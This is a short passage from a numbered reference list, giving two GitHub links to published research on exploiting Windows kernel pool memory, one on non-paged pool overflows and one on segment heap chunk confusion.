 2. https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation
 3. https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion/blob/master/Scoop_The_Windows_10_pool.pdf
